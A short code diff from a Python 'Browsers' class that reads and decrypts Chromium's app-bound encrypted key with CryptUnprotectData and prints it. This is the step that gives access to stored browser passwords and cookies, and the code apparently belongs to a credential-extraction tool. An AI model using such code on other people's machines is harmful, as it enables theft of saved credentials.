@@ -440,7 +440,7 @@ class Browsers:
                     appBoundEncryptedKey: str = jsonContent["os_crypt"]["app_bound_encrypted_key"]
                     appBoundEncryptedKey = base64.b64decode(appBoundEncryptedKey.encode())[5:]
 
-                    self.EncryptionKey = Syscalls.CryptUnprotectData(appBoundEncryptedKey)
+                    self.EncryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
                     print(self.EncryptionKey)
                     return self.EncryptionKey
 
